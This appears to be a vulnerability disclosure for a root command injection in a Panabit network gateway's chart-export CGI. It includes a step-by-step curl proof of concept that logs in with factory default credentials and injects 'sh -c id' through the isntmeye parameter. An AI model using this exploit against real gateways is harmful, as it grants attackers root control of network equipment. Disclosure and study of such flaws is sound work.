# Panabit Smart Application Gateway (派网)

- Vendor: Beijing Panabit Software Co., Ltd. (Panabit)
- Product: Panabit Smart Application Gateway / Internet Behavior Management (PanabitFREE edition; same-source SMB/OEM/MGW series)
- Firmware Version: TANGr7p10 (`PanabitFREE_TANGr7p10_20260817_Linux3`, built 2026-08-17, x86-64)
- Vulnerability Type: Post-authentication OS Command Injection (CWE-78)

## Overview

In Panabit's "chart export" shell CGI `dashboard/ajax_chart_dump`, the request parameter `isntmeye` is placed **unquoted at the command-name position** of a backtick command substitution. After variable expansion the shell word-splits the result, so the **first word becomes the executable name to run**, letting an attacker inject a command that executes as root:

`POST /cgi-bin/dashboard/ajax_chart_dump?action=history_chart_dump&isntmeye=sh -c id>/tmp/RPT_B`

The CGI is spawned by httpd as **root**, and the script performs **no authorization check of its own** (the only gate is httpd's session-Cookie check for `/cgi-bin/**`). A single valid management session is therefore enough for root RCE.

## Vulnerability Details

The sink is in `admin/cgi-bin/dashboard/ajax_chart_dump` (shell CGI, `#!/bin/sh`), lines 107–110 (the 124–127 branch is identical):

```sh
107:      if [ "${CGI_isntmeye}" ]; then
108:        printf "`${CGI_isntmeye} chart dump json=1 hours=${hours} tmend=${tmend1} ${tags}`,"
```

`${CGI_isntmeye}` sits inside backticks (command substitution) at the **command-name position**, **unquoted**. The attacker-controlled `isntmeye` value is therefore executed as the command name.

Line 25 of the same file is the **correct pattern** (proving this is an oversight, not intended behavior):

```sh
 25:  [ "${CGI_isntmeye}" = "ntmeye" ] && CHART_DUMP="${NTMEYE} chart dump"   # compare first, fixed command name
```

**Key pitfall**: the expanded `${var}` is **not re-parsed for metacharacters**, so a bare `isntmeye=;id` does not work (`;` is not treated as a separator). You must wrap it in `sh -c` to get redirection/output retrieval — payload: `isntmeye=sh -c id>/tmp/RPT_B`.

Dispatch table (`case "${CGI_action}"`): `action=history_chart_dump` is required; otherwise the `*)` branch returns `UNKNOW_ACTION`.

## Proof of Concept

**Prerequisite**: set up the environment on the analysis host 192.168.35.137 (symlink `/usr/ramdisk` + `/etc/PG.conf` + `ipe_httpd -C httpd.conf`, port 18443).

**Step 1 — log in to obtain a session Cookie** (factory credentials admin/panabit, esctool-encoded 32-hex):

```bash
CK=$(curl -sk -i -X POST https://127.0.0.1:18443/login/user.cgi \
  -d 'action=local_login&palang=ch' \
  -d 'username=590b62dd4a42161f3bcfa16e2baf6b33' \
  -d 'password=ee5c4080bbe094ffb47a84b32b8cabd8' \
  | tr -d '\r' | grep -i '^set-cookie:' | sed 's/^[Ss]et-[Cc]ookie: //; s/;.*//')
echo "$CK"    # confirm it is name=value like pauser_xxx=paonline_xxx-18443-
```

**Step 2 — inject the command** (post-auth, `isntmeye=sh -c id>/tmp/RPT_B`):

```bash
curl -sk -b "$CK" --get 'https://127.0.0.1:18443/cgi-bin/dashboard/ajax_chart_dump' \
  --data-urlencode 'action=history_chart_dump' \
  --data-urlencode 'types=x' \
  --data-urlencode 'isntmeye=sh -c id>/tmp/RPT_B'
```

Response: `{ "code": 0, "msg": "OK", "data": [,,]}` (no error echo — this is a blind injection; see Step 3).

**Step 3 — retrieve the command output**:

```bash
cat /tmp/RPT_B
```

## Impact

An authenticated attacker gains **root command execution**: read/write arbitrary files, change the admin password, plant persistent backdoors, tamper with traffic policy and audit records, and pivot into the internal network. Using `sh -c` redirection to write output to a file and read it back makes this an effectively **non-blind** command execution.

## Reproduction Result

Verified end-to-end against the real `ipe_httpd` (HTTPS 18443), with `isntmeye=sh -c id>/tmp/RPT_B`:

```
$ cat /tmp/RPT_B
uid=0(root) gid=0(root) groups=0(root)

$ ls -l /tmp/RPT_B
-rw-r--r-- 1 root root 39 /tmp/RPT_B
```

The injected command executed as root, with output retrievable. Only non-destructive commands (`id`) were used; no reboot/restore/upgrade was invoked.
